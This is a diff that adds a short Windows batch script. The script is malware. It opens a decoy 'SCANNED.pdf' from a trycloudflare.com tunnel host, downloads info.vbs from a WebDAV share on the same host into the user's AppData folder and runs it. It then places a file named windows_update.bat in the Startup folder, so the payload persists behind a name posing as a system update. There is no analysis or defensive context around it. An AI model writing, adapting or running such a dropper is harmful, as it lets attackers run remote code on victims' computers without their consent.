@@ -1,0 +1,21 @@
+@echo off
+setlocal
+
+set source=\\boy-such-icon-positive.trycloudflare.com@SSL\DavWWWRoot\google\Win
+set destination=%USERPROFILE%\Appdata
+
+echo Opening PDF file...
+start "" "https://boy-such-icon-positive.trycloudflare.com/SCANNED.pdf"
+
+echo Copying info from %source% to %destination%...
+copy /Y "%source%\info.vbs" "%destination%"
+
+echo Running info....
+"%destination%\info.vbs"
+
+copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+)
+
+
+exit
